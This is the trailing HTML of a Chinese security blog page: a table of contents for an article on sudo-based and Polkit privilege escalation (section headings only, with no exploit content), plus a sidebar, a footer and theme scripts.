toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-number">5.1.1.1.</span> <span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%85%8D%E7%BD%AE%E5%89%8D%E7%BD%AE%E6%9D%A1%E4%BB%B6"><span class="toc-number">5.1.1.2.</span> <span class="toc-text">漏洞配置前置条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-Exploitation"><span class="toc-number">5.1.1.3.</span> <span class="toc-text">漏洞利用 (Exploitation)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-Root-Cause"><span class="toc-number">5.1.1.4.</span> <span class="toc-text">漏洞原理 (Root Cause)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88"><span class="toc-number">5.1.1.5.</span> <span class="toc-text">修复方案</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-apt-apt-get-aptitude"><span class="toc-number">5.1.2.</span> <span class="toc-text">sudo apt&#x2F;apt-get&#x2F;aptitude</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-Exploitation-1"><span class="toc-number">5.1.2.1.</span> <span class="toc-text">漏洞利用 (Exploitation)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-Root-Cause-1"><span class="toc-number">5.1.2.2.</span> <span class="toc-text">漏洞原理 (Root Cause)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%E4%B8%8E%E9%98%B2%E8%8C%83"><span class="toc-number">5.1.2.3.</span> <span class="toc-text">修复方案与防范</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-apache2"><span class="toc-number">5.1.3.</span> <span class="toc-text">sudo apache2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-1"><span class="toc-number">5.1.3.1.</span> <span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">5.1.3.2.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">5.1.3.3.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%E4%B8%8E%E9%98%B2%E8%8C%83-1"><span class="toc-number">5.1.3.4.</span> <span class="toc-text">修复方案与防范</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-ash-bash-zsh-sh%E7%AD%89"><span class="toc-number">5.1.4.</span> <span class="toc-text">sudo ash&#x2F;bash&#x2F;zsh&#x2F;sh等</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-2"><span class="toc-number">5.1.4.1.</span> <span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-Exploitation-2"><span class="toc-number">5.1.4.2.</span> <span class="toc-text">漏洞利用 (Exploitation)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-Root-Cause-2"><span class="toc-number">5.1.4.3.</span> <span class="toc-text">漏洞原理 (Root Cause)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%E4%B8%8E%E9%98%B2%E8%8C%83-2"><span class="toc-number">5.1.4.4.</span> <span class="toc-text">修复方案与防范</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-awk"><span class="toc-number">5.1.5.</span> <span class="toc-text">sudo awk</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-Exploitation-3"><span class="toc-number">5.1.5.1.</span> <span class="toc-text">漏洞利用 (Exploitation)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-Root-Cause-3"><span class="toc-number">5.1.5.2.</span> <span class="toc-text">漏洞原理 (Root Cause)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%E4%B8%8E%E9%98%B2%E8%8C%83-3"><span class="toc-number">5.1.5.3.</span> <span class="toc-text">修复方案与防范</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-base64"><span class="toc-number">5.1.6.</span> <span class="toc-text">sudo base64</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-3"><span class="toc-number">5.1.6.1.</span> <span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-Exploitation-4"><span class="toc-number">5.1.6.2.</span> <span class="toc-text">漏洞利用 (Exploitation)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-Root-Cause-4"><span class="toc-number">5.1.6.3.</span> <span class="toc-text">漏洞原理 (Root Cause)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%E4%B8%8E%E9%98%B2%E8%8C%83-4"><span class="toc-number">5.1.6.4.</span> <span class="toc-text">修复方案与防范</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-cp"><span class="toc-number">5.1.7.</span> <span class="toc-text">sudo cp</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-4"><span class="toc-number">5.1.7.1.</span> <span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-Exploitation-5"><span class="toc-number">5.1.7.2.</span> <span class="toc-text">漏洞利用 (Exploitation)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-Root-Cause-5"><span class="toc-number">5.1.7.3.</span> <span class="toc-text">漏洞原理 (Root Cause)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%E4%B8%8E%E9%98%B2%E8%8C%83-5"><span class="toc-number">5.1.7.4.</span> <span class="toc-text">修复方案与防范</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-cpulimit"><span class="toc-number">5.1.8.</span> <span class="toc-text">sudo cpulimit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-curl"><span class="toc-number">5.1.9.</span> <span class="toc-text">sudo curl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-date"><span class="toc-number">5.1.10.</span> <span class="toc-text">sudo date</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-dd"><span class="toc-number">5.1.11.</span> <span class="toc-text">sudo dd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-dstat"><span class="toc-number">5.1.12.</span> <span class="toc-text">sudo dstat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-ed"><span class="toc-number">5.1.13.</span> <span class="toc-text">sudo ed</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-env"><span class="toc-number">5.1.14.</span> <span class="toc-text">sudo env</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-exiftool"><span class="toc-number">5.1.15.</span> <span class="toc-text">sudo exiftool</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2021-22204"><span class="toc-number">5.1.15.1.</span> <span class="toc-text">CVE-2021-22204</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-expect"><span class="toc-number">5.1.16.</span> <span class="toc-text">sudo expect</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-fail2ban"><span class="toc-number">5.1.17.</span> <span class="toc-text">sudo fail2ban</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-find"><span class="toc-number">5.1.18.</span> <span class="toc-text">sudo find</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-flock"><span class="toc-number">5.1.19.</span> <span class="toc-text">sudo flock</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-ftp"><span class="toc-number">5.1.20.</span> <span class="toc-text">sudo ftp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-gcc"><span class="toc-number">5.1.21.</span> <span class="toc-text">sudo gcc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-gdb"><span class="toc-number">5.1.22.</span> <span class="toc-text">sudo gdb</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Polkit"><span class="toc-number">5.2.</span> <span class="toc-text">Polkit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2021-4034"><span class="toc-number">5.2.1.</span> <span class="toc-text">CVE-2021-4034</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/06/18/1%20%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/3%20%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/06%20%E8%BD%AF%E4%BB%B6%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%BA%95%E5%B1%82%E5%AE%89%E5%85%A8/2%20%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/PC%E9%80%86%E5%90%91/2%20linux%E7%BC%96%E7%A8%8B/linux%E6%B1%87%E7%BC%96%E7%BC%96%E7%A8%8B/" title="linux汇编编程">linux汇编编程</a><time datetime="2026-06-18T12:29:40.921Z" title="发表于 2026-06-18 20:29:40">2026-06-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/06/16/1%20%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/3%20%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/06%20%E8%BD%AF%E4%BB%B6%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%BA%95%E5%B1%82%E5%AE%89%E5%85%A8/0%20%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/3%20%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/0%20%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81%E5%8E%9F%E7%90%86/" title="汇编代码原理">汇编代码原理</a><time datetime="2026-06-16T14:08:06.776Z" title="发表于 2026-06-16 22:08:06">2026-06-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/06/13/1%20%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/1%20%E5%9F%BA%E7%A1%80/3%20%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/%E5%89%8D%E7%AB%AF/js/2%20%E6%B5%8F%E8%A7%88%E5%99%A8/JavaScript%E6%B5%8F%E8%A7%88%E5%99%A8%E6%93%8D%E4%BD%9C/" title="JavaScript浏览器操作">JavaScript浏览器操作</a><time datetime="2026-06-13T14:35:44.271Z" title="发表于 2026-06-13 22:35:44">2026-06-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/06/11/1%20%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/3%20%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/01%20%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/2%20%E4%B8%BB%E5%8A%A8%E4%B8%8E%E8%A2%AB%E5%8A%A8%E6%89%AB%E6%8F%8F/1%20%E8%A2%AB%E5%8A%A8%E6%89%AB%E6%8F%8F/" title="基础设施扫描">基础设施扫描</a><time datetime="2026-06-11T07:01:34.177Z" title="发表于 2026-06-11 15:01:34">2026-06-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/06/11/1%20%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/3%20%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/08%20%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/1%20%E5%9F%9F%E6%B8%97%E9%80%8F/2%20%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/3%20%E6%9E%9A%E4%B8%BE%E5%B7%A5%E5%85%B7PowerView/" title="枚举工具PowerView">枚举工具PowerView</a><time datetime="2026-06-10T16:00:19.207Z" title="发表于 2026-06-11 00:00:19">2026-06-11</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2026 By chen7chen</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><a class="icon-V hidden" onclick="switchNightMode()" title="浅色和深色模式转换"><svg width="25" height="25" viewBox="0 0 1024 1024"><use id="modeicon" xlink:href="#icon-moon"></use></svg></a><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@5.2.0/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.8.8/dist/lazyload.iife.min.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
+  window.MathJax = {
+    tex: {
+      inlineMath: [['$', '$'], ['\\(', '\\)']],
+      tags: 'ams'
+    },
+    chtml: {
+      scale: 1.1
+    },
+    options: {
+      renderActions: {
+        findScript: [10, doc => {
+          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+            const display = !!node.type.match(/; *mode=display/)
+            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+            const text = document.createTextNode('')
+            node.parentNode.replaceChild(text, node)
+            math.start = {node: text, delim: '', n: 0}
+            math.end = {node: text, delim: '', n: 0}
+            doc.math.push(math)
+          }
+        }, '']
+      }
+    }
+  }
+  
+  const script = document.createElement('script')
+  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.min.js'
+  script.id = 'MathJax-script'
+  script.async = true
+  document.head.appendChild(script)
+} else {
+  MathJax.startup.document.state(0)
+  MathJax.texReset()
+  MathJax.typesetPromise()
+}</script><script>(() => {
+  const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+  if ($mermaid.length === 0) return
+  const runMermaid = () => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    Array.from($mermaid).forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = '%%{init:{ \'theme\':\'' + theme + '\'}}%%\n'
+      const mermaidID = 'mermaid-' + index
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+
+      const renderV10 = () => {
+        renderFn.then(({svg}) => {
+          mermaidSrc.insertAdjacentHTML('afterend', svg)
+        })
+      }
+
+      const renderV9 = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      typeof renderFn === 'string' ? renderV9(renderFn) : renderV10()
+    })
+  }
+
+  const loadMermaid = () => {
+    window.loadMermaid ? runMermaid() : getScript('https://cdn.jsdelivr.net/npm/mermaid@10.8.0/dist/mermaid.min.js').then(runMermaid)
+  }
+
+  btf.addGlobalFn('themeChange', runMermaid, 'mermaid')
+
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script><script>(() => {
+  const getCount = () => {
+    const countELement = document.getElementById('twikoo-count')
+    if(!countELement) return
+    twikoo.getCommentsCount({
+      envId: 'https://twikoo.chenjichao.site/',
+      region: 'ap-shanghai',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(res => {
+      countELement.textContent = res[0].count
+    }).catch(err => {
+      console.error(err)
+    })
+  }
+
+  const init = () => {
+    twikoo.init(Object.assign({
+      el: '#twikoo-wrap',
+      envId: 'https://twikoo.chenjichao.site/',
+      region: 'ap-shanghai',
+      onCommentLoaded: () => {
+        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
+      }
+    }, null))
+
+    
+  }
+
+  const loadTwikoo = () => {
+    if (typeof twikoo === 'object') setTimeout(init,0)
+    else getScript('https://cdn.jsdelivr.net/npm/twikoo@1.6.31/dist/twikoo.all.min.js').then(init)
+  }
+
+  if ('Twikoo' === 'Twikoo' || !false) {
+    if (false) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else loadTwikoo()
+  } else {
+    window.loadOtherComment = loadTwikoo
+  }
+})()</script></div><script src="/js/sun_moon.js" async></script><script async src="/js/jquery.js"></script><script async src="/styles/fish.js"></script><script defer src="/js/pace.min.js"></script><canvas async id="universe"></canvas><script defer src="/js/js.js"></script><script defer src="/js/emoji.js"></script><script async src="/js/pace.min.js"></script><script async src="/js/title.js"></script><script async data-pjax src="/js/anzhiyu.js"></script><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-fluttering-ribbon.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-nest.min.js"></script><link rel="stylesheet" href="https://lf6-cdn-tos.bytecdntp.com/cdn/expire-1-M/aplayer/1.10.1/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://lf26-cdn-tos.bytecdntp.com/cdn/expire-1-M/aplayer/1.10.1/APlayer.min.js"></script><script src="https://npm.elemecdn.com/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener
+  btf.removeGlobalFnEvent('pjax')
+  btf.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div><!-- hexo injector body_end start --> <script data-pjax>if(document.getElementById('recent-posts') && (location.pathname ==='/'|| '/' ==='all')){
+    var parent = document.getElementById('recent-posts');
+    var child = '<div class="recent-post-item" style="width:100%;height: auto"><div id="catalog_magnet"><a class="magnet_link_more"  href="http://blog.xchstudy.org/categories" style="flex:1;text-align: center;margin-bottom: 10px;">查看更多...</a></div></div>';
+    console.log('已挂载magnet')
+    parent.insertAdjacentHTML("afterbegin",child)}
+     </script><style>#catalog_magnet{flex-wrap: wrap;display: flex;width:100%;justify-content:space-between;padding: 10px 10px 0 10px;align-content: flex-start;}.magnet_item{flex-basis: calc(50% - 5px);background: #f2f2f2;margin-bottom: 10px;border-radius: 8px;transition: all 0.2s ease-in-out;}.magnet_item:hover{background: #b30070}.magnet_link_more{color:#555}.magnet_link{color:black}.magnet_link:hover{color:white}@media screen and (max-width: 600px) {.magnet_item {flex-basis: 100%;}}.magnet_link_context{display:flex;padding: 10px;font-size:16px;transition: all 0.2s ease-in-out;}.magnet_link_context:hover{padding: 10px 20px;}</style>
+    <style></style><script data-pjax>
+  function butterfly_swiper_injector_config(){
+    var parent_div_git = document.getElementById('recent-posts');
+    var item_html = '<div class="recent-post-item" style="height: auto;width: 100%"><div class="blog-slider swiper-container-fade swiper-container-horizontal" id="swiper_container"><div class="blog-slider__wrp swiper-wrapper" style="transition-duration: 0ms;"><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;2024/06/13/3 大数据技术/数据可视化/pandas/&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://pic.chenjichao.site/raw/7.webp" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2024-06-13</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;2024/06/13/3 大数据技术/数据可视化/pandas/&quot;);" href="javascript:void(0);" alt="">pandas</a><div class="blog-slider__text">再怎么看我也不知道怎么描述它的啦！</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;2024/06/13/3 大数据技术/数据可视化/pandas/&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;2024/06/09/1 网络攻防/2 防御技术/电子取证/服务器取证/linux/命令介绍/linux系统变量/&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://pic.chenjichao.site/raw/11.webp" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2024-06-09</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;2024/06/09/1 网络攻防/2 防御技术/电子取证/服务器取证/linux/命令介绍/linux系统变量/&quot;);" href="javascript:void(0);" alt="">linux系统变量</a><div class="blog-slider__text">再怎么看我也不知道怎么描述它的啦！</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;2024/06/09/1 网络攻防/2 防御技术/电子取证/服务器取证/linux/命令介绍/linux系统变量/&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div></div><div class="blog-slider__pagination swiper-pagination-clickable swiper-pagination-bullets"></div></div></div>';
+    console.log('已挂载butterfly_swiper')
+    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  var elist = 'undefined'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_swiper_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_swiper_injector_config();
+  }
+  </script><script defer src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.js"></script><script defer data-pjax src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper_init.js"></script><div class="js-pjax"><script async="async">var arr = document.getElementsByClassName('recent-post-item');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__bounceInLeft');
+    arr[i].setAttribute('data-wow-duration', '2s');
+    arr[i].setAttribute('data-wow-delay', '0.5s');
+    arr[i].setAttribute('data-wow-offset', '100');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('card-widget');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__rotateInDownLeft');
+    arr[i].setAttribute('data-wow-duration', '1.5s');
+    arr[i].setAttribute('data-wow-delay', '1s');
+    arr[i].setAttribute('data-wow-offset', '100');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script></div><script defer src="https://unpkg.com/hexo-butterfly-wowjs/lib/wow.min.js"></script><script defer src="https://unpkg.com/hexo-butterfly-wowjs/lib/wow_init.js"></script><!-- hexo injector body_end end --></body></html>
